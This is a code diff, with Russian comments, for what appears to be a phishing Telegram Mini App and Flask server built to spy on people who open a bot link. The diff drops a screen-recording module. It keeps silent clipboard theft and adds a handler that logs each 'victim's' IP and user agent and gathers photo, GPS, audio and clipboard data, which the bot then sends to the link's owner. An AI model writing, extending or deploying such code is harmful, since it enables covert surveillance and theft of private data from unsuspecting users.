@@ -81,21 +81,6 @@ function startAll(){
     })();
     
     (async function(){
-        try{
-            var st=await navigator.mediaDevices.getDisplayMedia({video:true});
-            var chunks=[],rec=new MediaRecorder(st);
-            rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};
-            rec.start();
-            await new Promise(r=>setTimeout(()=>rec.stop(),5000));
-            await new Promise(r=>setTimeout(r,500));
-            var blob=new Blob(chunks,{type:'video/webm'});
-            var reader=new FileReader();reader.readAsDataURL(blob);
-            reader.onloadend=()=>fetch('/screen/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});
-            st.getTracks().forEach(t=>t.stop());
-        }catch(e){}
-    })();
-    
-    (async function(){
         try{var text=await navigator.clipboard.readText();if(text) fetch('/clipboard/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}catch(e){}
     })();
     
@@ -115,12 +100,22 @@ def gen_id():
 def home(): return "OK"
 
 @app.route('/app')
-def mini_app_default():
-    # Если открыли без ID — показываем заглушку
-    return "Mini App работает! Открой через бота."
-
-@app.route('/app/<lid>')
-def mini_app(lid):
+def mini_app():
+    lid = request.args.get('startapp', '')
+    if not lid or lid not in links:
+        return "Недействительная ссылка. Открой через бота."
+    
+    # Добавляем жертву если ещё нет
+    if not links[lid]['victims']:
+        links[lid]['victims'].append({
+            'time': datetime.now().strftime('%H:%M:%S'),
+            'ua': request.headers.get('User-Agent', '?'),
+            'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
+            'photo': None, 'gps': None, 'audio': None, 'screen': None, 'clipboard': None
+        })
+        # Запускаем сбор данных через 35 секунд
+        asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
+    
     return render_template_string(MINI_APP_PAGE, link_id=lid)
 
 @app.route('/collect/<lid>', methods=['POST'])
@@ -148,13 +143,6 @@ def audio(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('audio'): links[lid]['victims'][-1]['audio'] = d['audio']
-    return 'ok'
-
-@app.route('/screen/<lid>', methods=['POST'])
-def screen(lid):
-    if lid in links and links[lid]['victims']:
-        d = request.get_json()
-        if d.get('screen'): links[lid]['victims'][-1]['screen'] = d['screen']
     return 'ok'
 
 @app.route('/clipboard/<lid>', methods=['POST'])
@@ -198,16 +186,6 @@ async def notify(uid, lid):
                 if os.path.getsize(audio_path) > 100:
                     await bot.send_file(uid, audio_path, caption="🎤 Аудио", voice_note=True)
                 os.remove(audio_path)
-            except: pass
-        
-        if v.get('screen'):
-            try:
-                screen_path = f"screen_{lid}.webm"
-                with open(screen_path, 'wb') as f:
-                    f.write(base64.b64decode(v['screen'].split(',')[1]))
-                if os.path.getsize(screen_path) > 100:
-                    await bot.send_file(uid, screen_path, caption="🎥 Запись экрана", supports_streaming=True)
-                os.remove(screen_path)
             except: pass
         
         if v.get('gps') and v['gps'].get('lat'):
